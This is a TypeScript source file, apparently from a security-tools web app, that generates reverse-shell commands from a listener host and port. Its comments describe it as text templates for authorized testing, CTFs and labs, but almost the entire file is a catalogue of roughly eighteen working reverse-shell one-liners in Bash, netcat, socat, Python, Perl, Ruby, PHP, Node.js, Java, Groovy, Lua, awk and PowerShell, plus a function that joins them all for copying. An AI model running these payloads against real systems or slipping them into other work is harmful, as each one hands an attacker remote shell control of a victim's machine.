import type {
  ReverseShell,
  ReverseShellConfig,
} from "@/lib/tools/reverse-shell/types"

// Standard, publicly documented reverse-shell one-liners (the same set
// published by PayloadsAllTheThings, HackTricks and revshells.com),
// parameterised by the listener address and port. For authorized security
// testing, CTFs and labs. These are text templates only: the tool never
// runs, connects, or starts a listener — see the UI's guard rails.

// Shown in the command when the field is still empty, so a copied command
// clearly has a blank to fill rather than a silently invented target.
export const HOST_PLACEHOLDER = "LHOST"
export const PORT_PLACEHOLDER = "LPORT"

/** The values to put into a template, with blanks shown as placeholders. */
export function resolveConfig(config: ReverseShellConfig): {
  host: string
  port: string
} {
  return {
    host: config.host.trim() || HOST_PLACEHOLDER,
    port: config.port.trim() || PORT_PLACEHOLDER,
  }
}

// Bracketed form an IPv6 address needs inside a URL-like path (Bash's
// /dev/tcp), where a bare ":" would be ambiguous.
function hostForPath(host: string): string {
  return host.includes(":") && !host.startsWith("[") ? `[${host}]` : host
}

export const SHELLS: readonly ReverseShell[] = [
  {
    id: "bash-i",
    name: "Bash -i",
    description: "Interactive Bash reverse shell over Bash's own /dev/tcp.",
    language: "bash",
    platform: "linux",
    category: "Unix",
    tags: ["bash", "linux", "unix"],
    template: ({ host, port }) =>
      `bash -i >& /dev/tcp/${hostForPath(host)}/${port} 0>&1`,
  },
  {
    id: "bash-196",
    name: "Bash 196",
    description: "Bash reverse shell using file descriptor 196.",
    language: "bash",
    platform: "linux",
    category: "Unix",
    tags: ["bash", "linux", "unix"],
    template: ({ host, port }) =>
      `0<&196;exec 196<>/dev/tcp/${hostForPath(host)}/${port}; sh <&196 >&196 2>&196`,
  },
  {
    id: "bash-readline",
    name: "Bash read line",
    description: "Bash TCP shell that reads and runs one command per line.",
    language: "bash",
    platform: "linux",
    category: "Unix",
    tags: ["bash", "linux", "unix"],
    template: ({ host, port }) =>
      `exec 5<>/dev/tcp/${hostForPath(host)}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
  },
  {
    id: "nc-e",
    name: "Netcat -e",
    description: "Netcat build that supports -e to run a shell directly.",
    language: "bash",
    platform: "linux",
    category: "Netcat",
    tags: ["netcat", "nc", "linux", "unix"],
    template: ({ host, port }) => `nc ${host} ${port} -e /bin/sh`,
  },
  {
    id: "nc-mkfifo",
    name: "Netcat mkfifo",
    description:
      "Netcat reverse shell for builds without -e (OpenBSD), via a named pipe.",
    language: "bash",
    platform: "linux",
    category: "Netcat",
    tags: ["netcat", "nc", "openbsd", "linux", "unix"],
    template: ({ host, port }) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
  },
  {
    id: "socat",
    name: "Socat",
    description: "Fully interactive Socat reverse shell with a PTY.",
    language: "bash",
    platform: "linux",
    category: "Unix",
    tags: ["socat", "linux", "unix", "pty"],
    template: ({ host, port }) =>
      `socat TCP:${host}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,
  },
  {
    id: "python",
    name: "Python",
    description: "Python socket reverse shell that spawns an interactive PTY.",
    language: "python",
    platform: "linux",
    category: "Python",
    tags: ["python", "python2", "linux", "unix"],
    template: ({ host, port }) =>
      `python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
  },
  {
    id: "python3",
    name: "Python 3",
    description:
      "Python 3 socket reverse shell that spawns an interactive PTY.",
    language: "python",
    platform: "linux",
    category: "Python",
    tags: ["python", "python3", "linux", "unix"],
    template: ({ host, port }) =>
      `python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
  },
  {
    id: "perl",
    name: "Perl",
    description: "Perl socket reverse shell.",
    language: "perl",
    platform: "linux",
    category: "Unix",
    tags: ["perl", "linux", "unix"],
    template: ({ host, port }) =>
      `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    id: "ruby",
    name: "Ruby",
    description: "Ruby socket reverse shell.",
    language: "ruby",
    platform: "linux",
    category: "Unix",
    tags: ["ruby", "linux", "unix"],
    template: ({ host, port }) =>
      `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    id: "php",
    name: "PHP",
    description: "PHP reverse shell using fsockopen.",
    language: "php",
    platform: "linux",
    category: "PHP",
    tags: ["php", "web", "linux", "unix"],
    template: ({ host, port }) =>
      `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: "nodejs",
    name: "Node.js",
    description: "Node.js reverse shell spawning /bin/sh over a socket.",
    language: "javascript",
    platform: "cross-platform",
    category: "Other",
    tags: ["node", "nodejs", "javascript", "js"],
    template: ({ host, port }) =>
      `node -e 'var c=require("net").connect(${port},"${host}",function(){var s=require("child_process").spawn("/bin/sh",[]);c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)})'`,
  },
  {
    id: "java",
    name: "Java",
    description: "Java Runtime reverse shell (Linux targets).",
    language: "java",
    platform: "linux",
    category: "Other",
    tags: ["java", "jvm", "linux"],
    template: ({ host, port }) =>
      `Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${hostForPath(host)}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"});p.waitFor();`,
  },
  {
    id: "groovy",
    name: "Groovy",
    description: "Groovy reverse shell (Linux targets).",
    language: "groovy",
    platform: "linux",
    category: "Other",
    tags: ["groovy", "jvm", "jenkins", "linux"],
    template: ({ host, port }) =>
      `String host="${host}";int port=${port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`,
  },
  {
    id: "lua",
    name: "Lua",
    description: "Lua reverse shell using LuaSocket (Linux targets).",
    language: "lua",
    platform: "linux",
    category: "Other",
    tags: ["lua", "linux", "unix"],
    template: ({ host, port }) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${host}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
  },
  {
    id: "awk",
    name: "Awk",
    description: "Awk reverse shell using gawk's networking extension.",
    language: "awk",
    platform: "linux",
    category: "Other",
    tags: ["awk", "gawk", "linux", "unix"],
    template: ({ host, port }) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${host}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
  {
    id: "powershell",
    name: "PowerShell",
    description: "PowerShell TCP reverse shell for Windows environments.",
    language: "powershell",
    platform: "windows",
    category: "Windows",
    tags: ["powershell", "windows", "ps"],
    template: ({ host, port }) =>
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${host}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: "powershell-oneliner",
    name: "PowerShell (one-liner)",
    description:
      "Compact PowerShell client suitable for a single command line.",
    language: "powershell",
    platform: "windows",
    category: "Windows",
    tags: ["powershell", "windows", "ps"],
    template: ({ host, port }) =>
      `$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sx=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sx,0,$sx.Length);$s.Flush()};$c.Close()`,
  },
]

/** The command a shell produces for the given listener. */
export function generate(
  shell: ReverseShell,
  config: ReverseShellConfig
): string {
  return shell.template(resolveConfig(config))
}

/**
 * The shells joined for "Copy all", each under a `# Name` comment. Only the
 * command text is included — no card metadata.
 */
export function generateAll(
  shells: readonly ReverseShell[],
  config: ReverseShellConfig
): string {
  return shells
    .map((shell) => `# ${shell.name}\n${generate(shell, config)}`)
    .join("\n\n")
}
